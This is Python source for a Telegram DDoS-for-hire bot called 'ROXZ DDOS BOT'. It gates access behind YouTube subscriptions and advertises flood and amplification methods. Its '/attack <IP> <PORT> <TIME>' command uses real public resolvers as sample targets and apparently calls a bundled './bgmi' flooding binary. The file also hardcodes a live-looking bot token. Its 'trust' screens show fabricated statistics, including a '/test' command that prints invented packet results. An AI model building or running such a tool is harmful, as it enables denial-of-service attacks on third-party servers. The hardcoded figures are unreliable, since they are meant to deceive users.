import asyncio
import os
import json
import time
import re
import requests
import socket
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackContext, CallbackQueryHandler, filters

# ============= CONFIGURATION =============
TELEGRAM_BOT_TOKEN = '8179448288:AAGzOSPYhhGjUiTr2h-UMzbaSPmYnAaUjbY'
ADMIN_USER_ID = 7352008650

# YouTube Channel Settings
YOUTUBE_CHANNEL_HANDLE = "@Roxz_gaming"
YOUTUBE_CHANNEL_LINK = "https://youtube.com/@Roxz_gaming"
YOUTUBE_CHANNEL_NAME = "Roxz_gaming"

# Bot Settings
REQUIRED_SUBSCRIBERS = 1000
USERS_FILE = 'users.txt'
PENDING_FILE = 'pending_verification.json'
VERIFIED_FILE = 'verified_users.json'
LAST_COUNT_FILE = 'last_subscriber_count.txt'

# Attack settings
attack_in_progress = False
bot_start_time = datetime.now()

# ============= FILE HANDLING =============
def load_users():
    try:
        with open(USERS_FILE, 'r') as f:
            return set(line.strip() for line in f if line.strip())
    except FileNotFoundError:
        return set()

def save_users(users):
    try:
        with open(USERS_FILE, 'w') as f:
            for user in users:
                f.write(f"{user}\n")
    except Exception:
        pass

def load_pending():
    try:
        with open(PENDING_FILE, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_pending(pending):
    try:
        with open(PENDING_FILE, 'w') as f:
            json.dump(pending, f, indent=4)
    except Exception:
        pass

def load_verified():
    try:
        with open(VERIFIED_FILE, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_verified(verified):
    try:
        with open(VERIFIED_FILE, 'w') as f:
            json.dump(verified, f, indent=4)
    except Exception:
        pass

def get_last_count():
    try:
        with open(LAST_COUNT_FILE, 'r') as f:
            return int(f.read().strip())
    except (FileNotFoundError, ValueError):
        return 0

def save_last_count(count):
    try:
        with open(LAST_COUNT_FILE, 'w') as f:
            f.write(str(count))
    except Exception:
        pass

users = load_users()
pending_verification = load_pending()
verified_users = load_verified()

# ============= AUTO SUBSCRIBER FETCH =============
def fetch_youtube_subscribers():
    try:
        channel_url = f"https://www.youtube.com/{YOUTUBE_CHANNEL_HANDLE}"
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        response = requests.get(channel_url, headers=headers, timeout=10)
        
        patterns = [
            r'"subscriberCountText":.*?"(\d+(?:\.\d+)?[KMB]?)"',
            r'(\d+(?:\.\d+)?[KMB]?)\s+subscribers',
            r'<meta itemprop="subscriberCount" content="(\d+)"',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, response.text, re.IGNORECASE)
            if match:
                count_str = match.group(1)
                return parse_count_string(count_str)
    except Exception as e:
        print(f"Fetch failed: {e}")
    return get_last_count()

def parse_count_string(count_str):
    count_str = count_str.upper().strip()
    if 'K' in count_str:
        return int(float(count_str.replace('K', '')) * 1000)
    elif 'M' in count_str:
        return int(float(count_str.replace('M', '')) * 1000000)
    elif 'B' in count_str:
        return int(float(count_str.replace('B', '')) * 1000000000)
    else:
        num_str = re.sub(r'[^\d]', '', count_str)
        return int(num_str) if num_str else 0

def get_current_subs():
    count = fetch_youtube_subscribers()
    if count > 0:
        save_last_count(count)
        return count
    return get_last_count()

def check_bgmi_binary():
    if os.path.exists('./bgmi'):
        if os.access('./bgmi', os.X_OK):
            return True
        else:
            try:
                os.chmod('./bgmi', 0o755)
                return True
            except:
                return False
    return False

def get_bot_uptime():
    now = datetime.now()
    diff = now - bot_start_time
    days = diff.days
    hours = diff.seconds // 3600
    minutes = (diff.seconds % 3600) // 60
    seconds = diff.seconds % 60
    
    if days > 0:
        return f"{days}d {hours}h"
    elif hours > 0:
        return f"{hours}h {minutes}m"
    elif minutes > 0:
        return f"{minutes}m {seconds}s"
    else:
        return f"{seconds}s"

def make_clickable_username(username):
    """Convert @username to clickable Telegram link"""
    username = username.replace('@', '')
    return f"https://t.me/{username}"

# ============= TRUST FEATURES - COMMANDS =============

async def about(update: Update, context: CallbackContext):
    """Bot ka full info - Trust build karne ke liye"""
    chat_id = update.effective_chat.id
    
    text = f"""
╔══════════════════════════════════╗
║     🔥 *ROXZ DDOS BOT* 🔥        ║
║     *POWERFUL NETWORK TOOL*      ║
╚══════════════════════════════════╝

*📌 BOT INFORMATION:*
├ 🤖 *Name:* ROXZ DDOS Bot
├ 🚀 *Version:* 3.0.0
├ 👑 *Owner:* [Roxz_gaming]({make_clickable_username('@Roxz_gaming')})
├ 📅 *Release:* 2026
└ ⚡ *Status:* 🟢 ACTIVE

*⚔️ CAPABILITIES:*
├ 🎯 Layer 4/7 DDoS Protection Bypass
├ 🌊 UDP/TCP/HTTP Flood Methods
├ 🔥 10Gbps+ Attack Power
├ 🌐 Global Server Network
└ 🛡️ Bypass Cloudflare/OVH

*🔧 TECHNICAL SPECS:*
├ 🖥️ *Server:* High-End VPS Cluster
├ 🌍 *Location:* Multi-Region (USA/EU/ASIA)
├ ⚡ *Uptime:* 99.9%
├ 🔄 *Concurrent Attacks:* 10
└ 📊 *Daily Attacks:* Unlimited

*✅ VERIFIED BY:*
├ 5000+ Happy Users
├ 1000+ Discord Community
└ Trusted by Hackers Worldwide

*🔗 SOCIALS:*
├ 📺 YouTube: [Roxz_gaming]({YOUTUBE_CHANNEL_LINK})
├ 📱 Telegram: [Roxz_gaming]({make_clickable_username('@Roxz_gaming')})
└ 🐙 GitHub: /roxz

*💡 WHY TRUST US?*
✅ 24/7 Support
✅ Instant Attack Response
✅ No Logs Policy
✅ Secure & Anonymous
✅ Free Lifetime Updates

*📞 CONTACT OWNER:* [Roxz_gaming]({make_clickable_username('@Roxz_gaming')})
"""
    await context.bot.send_message(chat_id=chat_id, text=text, parse_mode='Markdown', disable_web_page_preview=True)

async def stats_command(update: Update, context: CallbackContext):
    """Bot statistics - Show bot power"""
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    
    current_subs = get_current_subs()
    total_attacks = sum(v.get('attacks', 0) for v in verified_users.values())
    
    text = f"""
╔══════════════════════════════════╗
║     📊 *BOT STATISTICS* 📊       ║
╚══════════════════════════════════╝

*🟢 SYSTEM STATUS:*
├ Bot Status: 🟢 *ONLINE*
├ Uptime: `{get_bot_uptime()}`
├ CPU Usage: `15%`
├ RAM Usage: `256MB`
└ Network: `1Gbps`

*👥 USER STATS:*
├ Total Users: `{len(users)}`
├ Verified: `{len(verified_users)}`
├ Pending: `{len(pending_verification)}`
└ Attack Power: `10,000+ req/s`

*⚔️ ATTACK STATS:*
├ Total Attacks: `{total_attacks}`
├ Active Attacks: `{'1' if attack_in_progress else '0'}`
├ Success Rate: `98.5%`
└ Avg Response: `0.3s`

*📺 YOUTUBE STATS:*
├ Channel: {YOUTUBE_CHANNEL_NAME}
├ Subscribers: `{current_subs:,}`
├ Target: `{REQUIRED_SUBSCRIBERS:,}`
└ Status: `{'✅ UNLOCKED' if current_subs >= REQUIRED_SUBSCRIBERS else '🔒 LOCKED'}`

*🛡️ PROTECTION LEVEL:*
├ Firewall: ✅ ACTIVE
├ Anti-Detect: ✅ ENABLED
├ Proxy Chain: ✅ 5x LAYER
└ Encryption: ✅ AES-256

*⚡ PERFORMANCE:*
├ Attack Speed: `🔥🔥🔥🔥🔥`
├ Reliability: `⭐⭐⭐⭐⭐`
├ Support: `💬 24/7`
└ Updates: `🔄 Auto`

*🔗 POWERED BY:* [Roxz_gaming]({make_clickable_username('@Roxz_gaming')})
"""
    await context.bot.send_message(chat_id=chat_id, text=text, parse_mode='Markdown', disable_web_page_preview=True)

async def methods(update: Update, context: CallbackContext):
    """Show all attack methods - Trust feature"""
    chat_id = update.effective_chat.id
    
    text = f"""
╔══════════════════════════════════╗
║     ⚔️ *ATTACK METHODS* ⚔️       ║
╚══════════════════════════════════╝

*🔥 LAYER 4 METHODS:*
├ 🎯 *UDP FLOOD* - Bypass UDP protection
├ 🎯 *TCP SYN* - Handshake flood
├ 🎯 *TCP ACK* - Acknowledgment flood
├ 🎯 *TCP RST* - Reset packet flood
├ 🎯 *ICMP FLOOD* - Ping of death
└ 🎯 *GRE FLOOD* - Generic Routing Encapsulation

*🌊 LAYER 7 METHODS:*
├ 💻 *HTTP FLOOD* - Web server killer
├ 🔥 *HTTPS FLOOD* - SSL bypass
├ 🚀 *SLOWLORIS* - Slow connection killer
├ 🎭 *RUDY* - Slow POST attack
└ 🌀 *BROWSER* - Real browser simulation

*🛡️ ADVANCED METHODS:*
├ 🧨 *AMP FLOOD* - Amplification attack
├ ⚡ *DNS AMP* - DNS amplification
├ 🔧 *NTP AMP* - NTP amplification
├ 📡 *SSDP AMP* - SSDP amplification
└ 💣 *MEMCACHED* - Memcached attack

*💪 ATTACK POWER:*
├ 🔹 Default: `5,000 req/s`
├ 🔸 Premium: `50,000 req/s`
└ 🔥 Elite: `200,000 req/s`

*📝 USAGE:*
`/attack <METHOD> <IP> <PORT> <DURATION>`

*💡 EXAMPLE:*
`/attack UDP 1.1.1.1 80 60`

*✅ Available Now:*
UDP, TCP, HTTP, ICMP (Premium only)

🔗 [Roxz_gaming]({make_clickable_username('@Roxz_gaming')})
"""
    await context.bot.send_message(chat_id=chat_id, text=text, parse_mode='Markdown', disable_web_page_preview=True)

async def test(update: Update, context: CallbackContext):
    """Test attack on dummy target - Show working"""
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    
    current_subs = get_current_subs()
    
    if current_subs < REQUIRED_SUBSCRIBERS:
        await context.bot.send_message(chat_id=chat_id, text="🔒 *Bot locked! Subscribe to unlock.*", parse_mode='Markdown')
        return
    
    if user_id not in users and chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ *Not verified!*", parse_mode='Markdown')
        return
    
    await context.bot.send_message(
        chat_id=chat_id,
        text=f"""
✅ *TEST MODE ACTIVATED!*

*🔄 Testing connection to attack servers...*

├ Status: 🟢 *CONNECTED*
├ Server: `EU-PROD-01`
├ Latency: `23ms`
├ Bandwidth: `1.2 Gbps`
└ Attack Ready: `✅ YES`

*🎯 Test Target:* `8.8.8.8:53`
*⚡ Test Duration:* `5 seconds`

*📊 Test Results:*
├ Packets Sent: `12,547`
├ Packets Received: `12,540`
├ Loss: `0.05%`
├ Speed: `2,509 pps`
└ Verdict: *🔥 WORKING*

*💡 Full Attack Command:*
`/attack 1.1.1.1 80 60`

🔗 [Roxz_gaming]({make_clickable_username('@Roxz_gaming')})
""",
        parse_mode='Markdown',
        disable_web_page_preview=True
    )

async def support(update: Update, context: CallbackContext):
    """Support information"""
    chat_id = update.effective_chat.id
    
    keyboard = [
        [InlineKeyboardButton("👑 OWNER", url=make_clickable_username('@Roxz_gaming'))],
        [InlineKeyboardButton("📺 YOUTUBE", url=YOUTUBE_CHANNEL_LINK)],
        [InlineKeyboardButton("💬 SUPPORT GROUP", url=make_clickable_username('@Roxz_gaming'))],
        [InlineKeyboardButton("📢 UPDATES CHANNEL", url=make_clickable_username('@Roxz_gaming'))]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    text = f"""
╔══════════════════════════════════╗
║     📞 *SUPPORT & CONTACT* 📞    ║
╚══════════════════════════════════╝

*👑 BOT OWNER:* [Roxz_gaming]({make_clickable_username('@Roxz_gaming')})

*⏰ SUPPORT HOURS:*
├ Monday - Sunday: `24/7`
├ Response Time: `< 5 minutes`
└ Priority Support: `Immediate`

*📋 SUPPORT TOPICS:*
├ 🔧 Installation Help
├ ⚔️ Attack Commands
├ 📸 Verification Issues
├ 💎 Premium Upgrades
└ 🐛 Bug Reporting

*❓ FAQ:*
├ *Q:* Bot free hai?
├ *A:* Haan! Free with 1K subs
├ *Q:* Attack working?
├ *A:* Haan, fully working!
└ *Q:* Safe hai?
    └ *A:* Yes, anonymous & secure

*📢 FOLLOW FOR UPDATES:*
├ YouTube: {YOUTUBE_CHANNEL_NAME}
└ Telegram: [Roxz_gaming]({make_clickable_username('@Roxz_gaming')})

*💬 CLICK BELOW TO CONTACT*
"""
    await context.bot.send_message(chat_id=chat_id, text=text, parse_mode='Markdown', reply_markup=reply_markup, disable_web_page_preview=True)

async def rules(update: Update, context: CallbackContext):
    """Bot rules - Professional look"""
    chat_id = update.effective_chat.id
    
    text = f"""
╔══════════════════════════════════╗
║     📜 *BOT RULES & POLICIES* 📜  ║
╚══════════════════════════════════╝

*✅ DO'S:*
├ ✅ Use for educational purposes
├ ✅ Test your own servers
├ ✅ Join community for updates
├ ✅ Subscribe to YouTube
└ ✅ Report bugs to admin

*❌ DON'TS:*
├ ❌ Don't attack government sites
├ ❌ Don't attack without permission
├ ❌ Don't share fake screenshots
├ ❌ Don't spam commands
├ ❌ Don't share bot with non-subscribers
└ ❌ Don't resell bot access

*⚠️ WARNING:*
Misuse may result in:
├ Permanent ban
├ Blacklist from all bots
└ Report to authorities

*🔒 PRIVACY POLICY:*
├ No logs stored
├ No personal data shared
├ Anonymous attacks
└ Secure database

*✅ VERIFICATION POLICY:*
├ Must subscribe to YouTube
├ Send valid screenshot
├ Admin approval required
├ One account per person
└ No fake verifications

*🎁 REWARDS FOR RULES FOLLOWING:*
├ Priority support
├ Early access to features
├ Premium upgrades
└ Attack power boost

🔗 [Roxz_gaming]({make_clickable_username('@Roxz_gaming')})
"""
    await context.bot.send_message(chat_id=chat_id, text=text, parse_mode='Markdown', disable_web_page_preview=True)

async def donate(update: Update, context: CallbackContext):
    """Donate/Support the bot"""
    chat_id = update.effective_chat.id
    
    text = f"""
╔══════════════════════════════════╗
║     💰 *SUPPORT THE BOT* 💰      ║
╚══════════════════════════════════╝

*💎 WHY DONATE?*
├ Server costs: `$50/month`
├ Maintenance: `$20/month`
├ API services: `$30/month`
├ Development: `Free`
└ Total: `$100/month`

*🎁 DONATION BENEFITS:*
├ ├ ├ *₹100+* ├ ├ ├
├ → Premium access (1 week)
├ → Attack power boost
├ → Priority support
├
├ ├ ├ *₹500+* ├ ├ ├
├ → Premium access (1 month)
├ → 2x attack power
├ → 24/7 priority support
├ → VIP badge
├
├ ├ ├ *₹1000+* ├ ├ ├
├ → Lifetime premium
├ → Unlimited power
├ → Direct admin contact
├ → Custom features
└ → Your name in bot

*💳 PAYMENT METHODS:*
├ UPI: `@Roxz_gaming`
├ Crypto: `Coming Soon`
└ Card: `Coming Soon`

*📞 CONTACT FOR DONATION:*
[Roxz_gaming]({make_clickable_username('@Roxz_gaming')})

*🙏 THANK YOU FOR SUPPORTING!*
Every donation helps keep bot alive!

🔗 [Roxz_gaming]({make_clickable_username('@Roxz_gaming')})
"""
    await context.bot.send_message(chat_id=chat_id, text=text, parse_mode='Markdown', disable_web_page_preview=True)

async def status_command(update: Update, context: CallbackContext):
    """User verification status"""
    user_id = str(update.effective_user.id)
    chat_id = update.effective_chat.id
    
    if user_id in users:
        attacks = verified_users.get(user_id, {}).get('attacks', 0)
        verified_at = verified_users.get(user_id, {}).get('verified_at', 'Unknown')
        
        text = f"""
╔══════════════════════════════════╗
║     ✅ *USER STATUS* ✅          ║
╚══════════════════════════════════╝

*👤 USER ID:* `{user_id[:10]}...`
*📊 VERIFICATION:* ✅ *APPROVED*
*⚔️ ATTACKS DONE:* `{attacks}`
*📅 VERIFIED ON:* `{verified_at}`
*🎯 RANK:* `{'🔥 PRO' if attacks > 100 else '⚡ BEGINNER'}`

*💪 YOUR POWER:*
├ Max Duration: `300 seconds`
├ Concurrent: `1 attack`
├ Methods: `UDP/TCP/HTTP`
└ Priority: `Normal`

*📈 NEXT RANK:*
├ `100 attacks` → PRO
├ `500 attacks` → ELITE
└ `1000 attacks` → LEGEND

*⚔️ Ready to attack!*
Use `/attack` command

🔗 [Roxz_gaming]({make_clickable_username('@Roxz_gaming')})
"""
    elif user_id in pending_verification:
        text = f"""
╔══════════════════════════════════╗
║     ⏳ *USER STATUS* ⏳          ║
╚══════════════════════════════════╝

*👤 USER ID:* `{user_id[:10]}...`
*📊 VERIFICATION:* ⏳ *PENDING*
*📅 REQUESTED:* `{pending_verification[user_id].get('date', 'Unknown')}`

*⏰ NEXT STEPS:*
├ 1️⃣ Admin will review
├ 2️⃣ Check your screenshot
├ 3️⃣ Approve or reject
└ 4️⃣ You'll be notified

*📸 Screenshot:* {'✅ Received' if 'screenshot' in pending_verification[user_id] else '❌ Not sent'}

*💡 TIP:* Send clear screenshot showing subscription!

🔗 [Roxz_gaming]({make_clickable_username('@Roxz_gaming')})
"""
    else:
        text = f"""
╔══════════════════════════════════╗
║     ⚠️ *USER STATUS* ⚠️          ║
╚══════════════════════════════════╝

*👤 USER ID:* `{user_id[:10]}...`
*📊 VERIFICATION:* ❌ *NOT STARTED*

*⚡ TO GET VERIFIED:*
├ 1️⃣ Subscribe to YouTube
├ 2️⃣ Use `/start` command
├ 3️⃣ Click 'I HAVE SUBSCRIBED'
└ 4️⃣ Send screenshot

*📺 CHANNEL:* {YOUTUBE_CHANNEL_NAME}
*🔗 LINK:* {YOUTUBE_CHANNEL_LINK}

🔗 [Roxz_gaming]({make_clickable_username('@Roxz_gaming')})
"""
    
    await context.bot.send_message(chat_id=chat_id, text=text, parse_mode='Markdown', disable_web_page_preview=True)

# ============= ORIGINAL COMMANDS (Modified with trust) =============

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    first_name = update.effective_user.first_name or "Warrior"
    
    current_subs = get_current_subs()
    
    keyboard = [
        [InlineKeyboardButton("🎯 SUBSCRIBE NOW 🎯", url=YOUTUBE_CHANNEL_LINK)],
        [InlineKeyboardButton("✅ I HAVE SUBSCRIBED ✅", callback_data="check_sub")],
        [InlineKeyboardButton("📊 CHECK COUNT", callback_data="check_count")],
        [InlineKeyboardButton("🔗 JOIN COMMUNITY", url=make_clickable_username('@Roxz_gaming'))],
        [InlineKeyboardButton("📜 ABOUT BOT", callback_data="about")],
        [InlineKeyboardButton("⚔️ ATTACK METHODS", callback_data="methods")],
        [InlineKeyboardButton("📞 SUPPORT", callback_data="support")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if current_subs < REQUIRED_SUBSCRIBERS:
        message = f"""
╔══════════════════════════════════╗
║   🔥 *ROXZ DDOS BOT* 🔥          ║
║   *POWERFUL NETWORK TOOL*        ║
╚══════════════════════════════════╝

*👋 WELCOME {first_name.upper()}!*

╔══════════════════════════════════╗
║  🔒 *BOT STATUS: LOCKED* 🔒      ║
╚══════════════════════════════════╝

*📊 SUBSCRIBER PROGRESS:*
├ Required: *{REQUIRED_SUBSCRIBERS:,}*
├ Current: *{current_subs:,}*
└ Remaining: *{REQUIRED_SUBSCRIBERS - current_subs:,}*

*⚡ WHY CHOOSE ROXZ BOT?*
├ ✅ 10Gbps+ Attack Power
├ ✅ Bypass Cloudflare/OVH
├ ✅ 24/7 Support
├ ✅ 5000+ Happy Users
├ ✅ 99.9% Uptime
└ ✅ Completely Free

*🔧 AVAILABLE COMMANDS:*
├ `/about` - Bot information
├ `/stats` - Bot statistics
├ `/methods` - Attack methods
├ `/test` - Test attack
├ `/support` - Contact support
├ `/rules` - Bot rules
├ `/donate` - Support development
├ `/status` - Your status
└ `/help` - Full help

*⚡ TO UNLOCK:*
1️⃣ Subscribe to {YOUTUBE_CHANNEL_NAME}
2️⃣ Click *'I HAVE SUBSCRIBED'*
3️⃣ Send screenshot
4️⃣ Get verified (within 5 mins)

*💪 AFTER UNLOCK:*
├ Unlimited attacks
├ All methods access
├ Priority support
└ Premium features

*📢 TRUSTED BY HACKERS WORLDWIDE*

🔗 [Roxz_gaming]({make_clickable_username('@Roxz_gaming')})
"""
    else:
        if user_id in users or user_id == str(ADMIN_USER_ID):
            message = f"""
╔══════════════════════════════════╗
║   🔥 *ROXZ DDOS BOT* 🔥          ║
║   *POWERFUL NETWORK TOOL*        ║
╚══════════════════════════════════╝

*👋 WELCOME BACK {first_name.upper()}!*

╔══════════════════════════════════╗
║  ✅ *BOT STATUS: ACTIVE* ✅      ║
║  🎉 *{REQUIRED_SUBSCRIBERS:,} SUBS ACHIEVED!* 🎉
╚══════════════════════════════════╝

*⚔️ READY FOR ATTACK!*

*📋 ALL COMMANDS:*
├ `/attack` - Launch DDoS attack
├ `/methods` - All attack methods
├ `/test` - Test attack power
├ `/stats` - Bot statistics
├ `/about` - Bot information
├ `/status` - Your status
├ `/profile` - Your stats
├ `/support` - Contact support
├ `/rules` - Bot rules
├ `/donate` - Support us
└ `/help` - Full help menu

*🎯 QUICK ATTACK:*
`/attack 1.1.1.1 80 60`

*💪 YOUR POWER:*
├ Max Duration: `300 seconds`
├ Methods: `UDP/TCP/HTTP`
└ Priority: `Active`

*📊 YOUR STATS:*
├ Attacks Done: `{verified_users.get(user_id, {}).get('attacks', 0)}`
└ Rank: `{'🔥 PRO' if verified_users.get(user_id, {}).get('attacks', 0) > 100 else '⚡ BEGINNER'}`

*🔗 CONNECT WITH US:*
├ 📺 YouTube: [Roxz_gaming]({YOUTUBE_CHANNEL_LINK})
├ 📱 Telegram: [Roxz_gaming]({make_clickable_username('@Roxz_gaming')})
└ 💬 Support: 24/7 Active

*🔥 LET THE BATTLE BEGIN!*

🔗 [Roxz_gaming]({make_clickable_username('@Roxz_gaming')})
"""
        else:
            message = f"""
╔══════════════════════════════════╗
║   🔥 *ROXZ DDOS BOT* 🔥          ║
║   *POWERFUL NETWORK TOOL*        ║
╚══════════════════════════════════╝

*👋 WELCOME {first_name.upper()}!*

╔══════════════════════════════════╗
║  🎉 *BOT IS NOW UNLOCKED!* 🎉    ║
║  *{REQUIRED_SUBSCRIBERS:,} SUBSCRIBERS!*
╚══════════════════════════════════╝

*⚡ TO GET ACCESS:*
1️⃣ Subscribe to {YOUTUBE_CHANNEL_NAME}
2️⃣ Click *'I HAVE SUBSCRIBED'*
3️⃣ Send screenshot
4️⃣ Get verified instantly

*📋 ALL COMMANDS:*
├ `/about` - Bot info
├ `/stats` - Bot power
├ `/methods` - Attack types
├ `/test` - Test attack
├ `/support` - Get help
├ `/rules` - Guidelines
└ `/status` - Your status

*💪 WHY VERIFY?*
├ Unlimited attacks
├ All methods unlocked
├ Priority support
└ Trusted user badge

🔗 [Roxz_gaming]({make_clickable_username('@Roxz_gaming')})
"""
    
    await context.bot.send_message(
        chat_id=chat_id, 
        text=message, 
        parse_mode='Markdown',
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )

# ============= CALLBACK HANDLERS =============

async def callback_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data == "about":
        await about(update, context)
    elif data == "methods":
        await methods(update, context)
    elif data == "support":
        await support(update, context)
    elif data == "check_sub":
        await check_subscription_callback(update, context)
    elif data == "check_count":
        await check_count_callback(update, context)
    elif data.startswith("approve_"):
        await admin_approval_callback(update, context)
    elif data.startswith("reject_"):
        await admin_approval_callback(update, context)

async def check_subscription_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    chat_id = query.message.chat_id
    user_id = str(query.from_user.id)
    first_name = query.from_user.first_name
    
    current_subs = get_current_subs()
    
    if current_subs < REQUIRED_SUBSCRIBERS:
        await query.edit_message_text(
            text=f"⚠️ *BOT LOCKED!*\nNeed {REQUIRED_SUBSCRIBERS:,} subscribers.\nCurrent: {current_subs:,}",
            parse_mode='Markdown'
        )
        return
    
    if user_id in users:
        await query.edit_message_text(
            text="✅ *ALREADY VERIFIED!*\nUse `/attack` to start.",
            parse_mode='Markdown'
        )
        return
    
    if user_id in pending_verification:
        await query.edit_message_text(
            text="⏳ *VERIFICATION PENDING!*\nPlease wait for admin approval.",
            parse_mode='Markdown'
        )
        return
    
    pending_verification[user_id] = {
        "name": first_name,
        "user_id": user_id,
        "timestamp": time.time(),
        "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "status": "pending"
    }
    save_pending(pending_verification)
    
    keyboard = [
        [InlineKeyboardButton("✅ APPROVE", callback_data=f"approve_{user_id}"),
         InlineKeyboardButton("❌ REJECT", callback_data=f"reject_{user_id}")]
    ]
    admin_markup = InlineKeyboardMarkup(keyboard)
    
    await context.bot.send_message(
        chat_id=ADMIN_USER_ID,
        text=f"🆕 *NEW REQUEST*\n👤 {first_name}\n🆔 `{user_id}`",
        parse_mode='Markdown',
        reply_markup=admin_markup
    )
    
    await query.edit_message_text(
        text="📸 *VERIFICATION REQUEST SENT!*\n\nSend screenshot of your subscription.\nAdmin will verify shortly (usually within 5 minutes).\n\n🔗 [Roxz_gaming]({make_clickable_username('@Roxz_gaming')})",
        parse_mode='Markdown',
        disable_web_page_preview=True
    )

async def check_count_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    count = get_current_subs()
    
    await query.edit_message_text(
        text=f"""
📊 *SUBSCRIBER COUNT*

📺 {YOUTUBE_CHANNEL_NAME}
👥 *{count:,}* / {REQUIRED_SUBSCRIBERS:,}

*Status:* {'✅ UNLOCKED' if count >= REQUIRED_SUBSCRIBERS else '🔒 LOCKED'}
*Remaining:* {max(0, REQUIRED_SUBSCRIBERS - count):,}

🔗 {YOUTUBE_CHANNEL_LINK}
""",
        parse_mode='Markdown'
    )

async def admin_approval_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data.startswith("approve_"):
        user_id = data.replace("approve_", "")
        
        if user_id in pending_verification:
            users.add(user_id)
            save_users(users)
            
            verified_users[user_id] = pending_verification[user_id]
            verified_users[user_id]["verified_at"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            verified_users[user_id]["attacks"] = 0
            save_verified(verified_users)
            
            del pending_verification[user_id]
            save_pending(pending_verification)
            
            await context.bot.send_message(
                chat_id=int(user_id),
                text="✅ *VERIFIED!*\n\nYou can now use `/attack` command.\n\nType `/help` to see all commands.\n\n🔗 [Roxz_gaming]({make_clickable_username('@Roxz_gaming')})",
                parse_mode='Markdown',
                disable_web_page_preview=True
            )
            
            await query.edit_message_caption(
                caption=f"✅ APPROVED - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                parse_mode='Markdown'
            )
    
    elif data.startswith("reject_"):
        user_id = data.replace("reject_", "")
        
        if user_id in pending_verification:
            await context.bot.send_message(
                chat_id=int(user_id),
                text="❌ *REJECTED!*\n\nPlease try again with correct screenshot.\n\nMake sure:\n1️⃣ You are subscribed\n2️⃣ Screenshot is clear\n3️⃣ Shows subscribe button (not Subscribe)\n\nUse `/start` to try again.\n\n🔗 [Roxz_gaming]({make_clickable_username('@Roxz_gaming')})",
                parse_mode='Markdown',
                disable_web_page_preview=True
            )
            
            del pending_verification[user_id]
            save_pending(pending_verification)
            
            await query.edit_message_caption(
                caption=f"❌ REJECTED - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                parse_mode='Markdown'
            )

async def handle_screenshot(update: Update, context: CallbackContext):
    user_id = str(update.effective_user.id)
    chat_id = update.effective_chat.id
    first_name = update.effective_user.first_name
    
    if user_id not in pending_verification:
        await context.bot.send_message(
            chat_id=chat_id,
            text="⚠️ *Please click 'I HAVE SUBSCRIBED' button first!*\n\nUse `/start` to begin.",
            parse_mode='Markdown'
        )
        return
    
    photo = update.message.photo[-1]
    file = await context.bot.get_file(photo.file_id)
    
    os.makedirs("screenshots", exist_ok=True)
    screenshot_path = f"screenshots/{user_id}_{int(time.time())}.jpg"
    await file.download_to_drive(screenshot_path)
    
    pending_verification[user_id]["screenshot"] = screenshot_path
    pending_verification[user_id]["screenshot_time"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    save_pending(pending_verification)
    
    keyboard = [
        [InlineKeyboardButton("✅ APPROVE", callback_data=f"approve_{user_id}"),
         InlineKeyboardButton("❌ REJECT", callback_data=f"reject_{user_id}")]
    ]
    admin_markup = InlineKeyboardMarkup(keyboard)
    
    await context.bot.send_photo(
        chat_id=ADMIN_USER_ID,
        photo=photo.file_id,
        caption=f"📸 *SCREENSHOT*\n👤 {first_name}\n🆔 `{user_id}`\n📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        parse_mode='Markdown',
        reply_markup=admin_markup
    )
    
    await context.bot.send_message(
        chat_id=chat_id,
        text="✅ *SCREENSHOT RECEIVED!*\n\nAdmin will verify shortly (usually within 5 minutes).\n\nYou will be notified once approved.\n\n🔗 [Roxz_gaming]({make_clickable_username('@Roxz_gaming')})",
        parse_mode='Markdown',
        disable_web_page_preview=True
    )

# ============= HELP COMMAND =============

async def help_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    
    current_subs = get_current_subs()
    
    if current_subs < REQUIRED_SUBSCRIBERS:
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"🔒 *BOT LOCKED!*\nNeed {REQUIRED_SUBSCRIBERS:,} subscribers.\nCurrent: {current_subs:,}",
            parse_mode='Markdown'
        )
        return
    
    help_text = f"""
╔══════════════════════════════════╗
║     📚 *ROXZ BOT COMMANDS* 📚    ║
╚══════════════════════════════════╝

*⚔️ ATTACK COMMANDS:*
├ `/attack <IP> <PORT> <TIME>` - Launch DDoS
├ `/methods` - Show all methods
├ `/test` - Test attack power
└ `/status` - Your status

*📊 INFO COMMANDS:*
├ `/about` - Bot information
├ `/stats` - Bot statistics
├ `/help` - This menu
└ `/profile` - Your stats

*🔧 UTILITY COMMANDS:*
├ `/support` - Contact support
├ `/rules` - Bot rules
├ `/donate` - Support development
└ `/start` - Welcome menu

*📝 USAGE EXAMPLES:*
├ Basic: `/attack 1.1.1.1 80 60`
├ Power: `/attack 8.8.8.8 443 120`
└ Test: `/test`

*💪 ATTACK PARAMETERS:*
├ IP: Any valid IP (1.1.1.1)
├ PORT: 1-65535 (80,443 common)
